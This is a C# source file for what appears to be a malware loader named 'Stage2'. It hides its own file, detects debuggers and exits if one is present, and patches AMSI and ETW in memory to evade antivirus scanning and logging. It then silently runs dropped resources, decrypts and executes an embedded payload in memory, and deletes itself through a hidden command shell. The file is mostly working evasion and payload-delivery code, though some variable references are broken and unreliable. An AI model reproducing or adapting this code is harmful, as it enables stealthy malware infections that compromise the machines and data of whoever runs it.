using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace iUfZskonRxQHXiJzwdok
{
  internal class Stage2
  {
    [DllImport("kernel32.dll")]
    private static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    private static void Main(string[] args)
    {
      string fileName = Process.GetCurrentProcess().MainModule.FileName;
      File.SetAttributes(fileName, FileAttributes.Hidden | FileAttributes.System);

      IntPtr hModule = Stage2.LoadLibrary("kernel32.dll");
      IntPtr CheckRemoteDebuggerPresent = Stage2.GetProcAddress(hModule, Encoding.UTF8.GetString(Stage2.AESDecrypt
      (Convert.FromBase64String("vYhBhJfROLULmQk1P9jbiqyIcg6RWlONx2FLYpdRzZA="), Convert.FromBase64String("+KOlpdbdkMhzFf3VDSyAkV8TPpzotEy7fRvL1mO8E14="), Convert.FromBase64String("HYl2x9zmGn/Yh4ebzFs3/A=="))));
      
      IntPtr isDebuggerPresent = Stage2.GetProcAddress(hModule, Encoding.UTF8.GetString(Stage2.AESDecrypt
      (Convert.FromBase64String("c1nS5++qjY7Hw4/oCUn+CIrSfxw0Ebd6ppjM595mDGs="), Convert.FromBase64String("+KOlpdbdkMhzFf3VDSyAkV8TPpzotEy7fRvL1mO8E14="), Convert.FromBase64String("HYl2x9zmGn/Yh4ebzFs3/A=="))));
      
      Stage2.CheckRemoteDebuggerPresent forFunctionPointer1 = (Stage2.CheckRemoteDebuggerPresent) Marshal.GetDelegateForFunctionPointer(procAddress1, typeof (Stage2.CheckRemoteDebuggerPresent));
      Stage2.isDebuggerPresent forFunctionPointer2 = (Stage2.isDebuggerPresent) Marshal.GetDelegateForFunctionPointer(isDebuggerPresent, typeof (Stage2.isDebuggerPresent));
      
      bool isDebuggerPresent = false;
      
      int num1 = forFunctionPointer1(Process.GetCurrentProcess().Handle, ref isDebuggerPresent) ? 1 : 0;
      
      if (Debugger.IsAttached || isDebuggerPresent || forFunctionPointer2()) { Environment.Exit(1); }
        
      Stage2.VirtualProtect forFunctionPointer3 = (Stage2.VirtualProtect) Marshal.GetDelegateForFunctionPointer(Stage2.GetProcAddress(hModule, "VirtualProtect"), typeof (Stage2.VirtualProtect));
      IntPtr AmsiScanBuffer = Stage2.GetProcAddress(Stage2.LoadLibrary("amsi.dll"), Encoding.UTF8.GetString(Stage2.AESDecrypt
      (Convert.FromBase64String("a7jXmj26CaSQ7QkGWLqc7w=="), Convert.FromBase64String("+KOlpdbdkMhzFf3VDSyAkV8TPpzotEy7fRvL1mO8E14="), Convert.FromBase64String("HYl2x9zmGn/Yh4ebzFs3/A=="))));
      byte[] source1;
      if (IntPtr.Size == 8)
        source1 = new byte[6]
        {
          (byte) 184,
          (byte) 87,
          (byte) 0,
          (byte) 7,
          (byte) 128,
          (byte) 195
        };
      else
        source1 = new byte[8]
        {
          (byte) 184,
          (byte) 87,
          (byte) 0,
          (byte) 7,
          (byte) 128,
          (byte) 194,
          (byte) 24,
          (byte) 0
        };
      
      uint lpflOldProtect;
      int num2 = forFunctionPointer3(procAddress3, (UIntPtr) (ulong) source1.Length, 64U, out lpflOldProtect) ? 1 : 0;
      Marshal.Copy(source1, 0, procAddress3, source1.Length);
      int num3 = forFunctionPointer3(procAddress3, (UIntPtr) (ulong) source1.Length, lpflOldProtect, out lpflOldProtect) ? 1 : 0;
      
      IntPtr EtwEventWrite = Stage2.GetProcAddress(Stage2.LoadLibrary("ntdll.dll"), Encoding.UTF8.GetString(Stage2.AESDecrypt
      (Convert.FromBase64String("NwkhkRnXRVXQCljgksJv9Q=="), Convert.FromBase64String("+KOlpdbdkMhzFf3VDSyAkV8TPpzotEy7fRvL1mO8E14="), Convert.FromBase64String("HYl2x9zmGn/Yh4ebzFs3/A=="))));
      byte[] source2;
      if (IntPtr.Size == 8)
        source2 = new byte[1]{ (byte) 195 };
      else
        source2 = new byte[3]
        {
          (byte) 194,
          (byte) 20,
          (byte) 0
        };

      int num4 = forFunctionPointer3(EtwEventWrite, (UIntPtr) (ulong) source2.Length, 64U, out lpflOldProtect) ? 1 : 0;
      Marshal.Copy(source2, 0, EtwEventWrite, source2.Length);
      int num5 = forFunctionPointer3(EtwEventWrite, (UIntPtr) (ulong) source2.Length, lpflOldProtect, out lpflOldProtect) ? 1 : 0;
      
      string payloadExe = Encoding.UTF8.GetString(Stage2.AESDecrypt
      (Convert.FromBase64String("axfAH/4KoxcX8xnRv4VcuA=="), Convert.FromBase64String("+KOlpdbdkMhzFf3VDSyAkV8TPpzotEy7fRvL1mO8E14="), Convert.FromBase64String("HYl2x9zmGn/Yh4ebzFs3/A==")));
      
      string runpeDLL = Encoding.UTF8.GetString(Stage2.AESDecrypt
      (Convert.FromBase64String("gXH9imK6+BVM3lCUdnmvLg=="), Convert.FromBase64String("+KOlpdbdkMhzFf3VDSyAkV8TPpzotEy7fRvL1mO8E14="), Convert.FromBase64String("HYl2x9zmGn/Yh4ebzFs3/A==")));
      
      foreach (string manifestResourceName in Assembly.GetExecutingAssembly().GetManifestResourceNames())
      {
        string name = manifestResourceName;
        if (!(name == payloadExe) && !(name == runpeDLL))
        {
          File.WriteAllBytes(name, Stage2.ExtractAssembly
    (name));
          File.SetAttributes(name, FileAttributes.Hidden | FileAttributes.System);
          new Thread((ThreadStart) (() =>
          {
            Process.Start(name).WaitForExit();
            File.SetAttributes(name, FileAttributes.Normal);
            File.Delete(name);
          })).Start();
        }
      }
      byte[] rawAssembly = Stage2.
      gzipDecrypt(Stage2.AESDecrypt(Stage2.ExtractAssembly(payloadExe), Convert.FromBase64String("+KOlpdbdkMhzFf3VDSyAkV8TPpzotEy7fRvL1mO8E14="), Convert.FromBase64String("HYl2x9zmGn/Yh4ebzFs3/A==")));
      string[] strArray = new string[0];
      try
      {
        strArray = args[0].Split(' ');
      }
      catch
      {
      }
      MethodInfo entryPoint = Assembly.Load(rawAssembly).EntryPoint;
      try
      {
        entryPoint.Invoke((object) null, new object[1]
        {
          (object) strArray
        });
      }
      catch
      {
        entryPoint.Invoke((object) null, (object[]) null);
      }
      // /c choice /c y /n /d y /t 1 & attrib -h -s "
      string cmdArgs = Encoding.UTF8.GetString(Stage2.AESDecrypt
      (Convert.FromBase64String("tyOngqANS/gdeSNHJP+9Yjhpk5S/JgI4Hqgga7v1GKzA26K3ivOmeRCjS4em8Aq8"), Convert.FromBase64String("+KOlpdbdkMhzFf3VDSyAkV8TPpzotEy7fRvL1mO8E14="), Convert.FromBase64String("HYl2x9zmGn/Yh4ebzFs3/A==")));
      Process.Start(new ProcessStartInfo()
      {
        Arguments = cmdArgs + fileName + "\" & del \"" + fileName + "\"",
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true,
        FileName = "cmd.exe"
      });
    }

    private static byte[] AESDecrypt(byte[] input, byte[] key, byte[] iv)
    {
      AesManaged aesManaged = new AesManaged();
      aesManaged.Mode = CipherMode.CBC;
      aesManaged.Padding = PaddingMode.PKCS7;
      ICryptoTransform decryptor = aesManaged.CreateDecryptor(key, iv);
      byte[] numArray = decryptor.TransformFinalBlock(input, 0, input.Length);
      decryptor.Dispose();
      aesManaged.Dispose();
      return numArray;
    }

    private static byte[] gzipDecrypt(byte[] bytes)
    {
      MemoryStream memoryStream = new MemoryStream(bytes);
      MemoryStream destination = new MemoryStream();
      GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress);
      gzipStream.CopyTo((Stream) destination);
      gzipStream.Dispose();
      destination.Dispose();
      memoryStream.Dispose();
      return destination.ToArray();
    }

    private static byte[] ExtractAssembly(string name)
    {
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      MemoryStream destination = new MemoryStream();
      Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
      manifestResourceStream.CopyTo((Stream) destination);
      manifestResourceStream.Dispose();
      byte[] array = destination.ToArray();
      destination.Dispose();
      return array;
    }

    private delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    private delegate bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

    private delegate bool isDebuggerPresent();
  }
}
